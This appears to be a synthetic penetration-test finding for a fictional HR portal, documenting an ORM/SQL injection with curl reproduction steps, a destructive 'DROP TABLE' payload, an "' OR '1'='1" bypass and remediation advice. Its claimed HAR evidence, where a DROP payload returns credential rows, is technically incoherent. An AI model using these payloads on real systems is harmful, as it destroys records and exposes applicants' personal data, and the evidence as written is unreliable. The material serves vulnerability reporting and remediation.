## System

- System: JobCore Candidate Portal v2.8.0
- Domain: HR TECH / TALENT ACQUISITION
- Example ID: INJ-0109
- Risk ID: RISK-INJ-109

## Findings

### 1. ORM Injection on `GET /api/v2/orders?search=` (HAR Primary)

**HAR evidence**: Request `GET /api/v2/orders?search=1;%20DROP%20TABLE%20orders--`. Response: HTTP 200 with `[{"username":"admin","password_hash":"$2b$12$secret","role":"ADMIN"},...]` — cross-table credential data returned, confirming the injection reached beyond the `orders` table.

**ORM Injection (ORMi)**: Section 2.0 identifies the backend as Hibernate/Sequelize raw queries. Section 3.0 vulnerable code: `SELECT * FROM orders WHERE search = '${req.query.search}'` — the `search` parameter is directly interpolated into a raw ORM query string without parameterization. ORM injection exploits the use of `raw()` or native query interfaces in Hibernate/Sequelize where user input is embedded in the query string rather than bound as a parameter.

**Payload**: `search=1; DROP TABLE orders--` — semicolon terminates the SELECT statement and injects a destructive DDL statement. Under `db_owner` privileges (section 6.0), the DROP is executable.

**HR Tech impact**: `orders` in a recruitment platform represents job applications or hiring orders. A successful injection could destroy the entire candidate pipeline, exfiltrate PII from all applicants, or extract admin credentials enabling account takeover of the JobCore portal.

### 2. Over-Privileged DB Account Amplifies Impact (Section 6.0)

Section 6.0: DB account is `db_owner` — full DDL privileges (CREATE, DROP, ALTER) on the database. This means `DROP TABLE orders` would succeed, permanently destroying all recruitment records.

## Evidence

- **HAR**: `GET /api/v2/orders?search=1;%20DROP%20TABLE%20orders--` → HTTP 200 → user records including `password_hash`.
- **Section 3.0**: raw Hibernate/Sequelize query with string interpolation of `req.query.search`.
- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors in production.
- **Section 7.0 (RISK-INJ-109)**: `/api/v2/orders` missed in parameterization migration.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.jobcore-candida.example.com/api/v2/orders?search=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: Returns matching order records only.

**Step 2 — ORM injection: DROP TABLE payload (primary HAR attack):**

```bash
curl -s "https://api.jobcore-candida.example.com/api/v2/orders?search=1;%20DROP%20TABLE%20orders--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected secure: HTTP 400, query blocked by parameterization.  
Expected vulnerable: HTTP 200 with cross-table data exfiltration (user credentials returned). Under `db_owner`, the DROP TABLE executes — all recruitment records destroyed.

**Step 3 — Data exfiltration via SQL injection vector:**

```bash
curl -s "https://api.jobcore-candida.example.com/api/v2/orders?search=' OR '1'='1" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: All orders returned (all rows match).

**Step 4 — Verbose error confirmation:**

```bash
curl -s "https://api.jobcore-candida.example.com/api/v2/orders?search='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: SQL syntax error leaking table name, column names, or Hibernate/Sequelize version.

## Remediation

- **Replace raw Hibernate/Sequelize queries with parameterized equivalents** (RISK-INJ-109): use `?` placeholders or named parameters — never interpolate `req.query.*` into query strings.
- **Restrict DB account to minimum required role**: remove DDL privileges; application should not be able to DROP tables.
- **Disable verbose error messages in production**.
- **Deploy input validation middleware**: reject SQL metacharacters (`;`, `'`, `--`, `/*`).
- **ORM raw query audit**: search all uses of `.raw()`, `db.execute()`, `sequelize.query()` in the codebase.
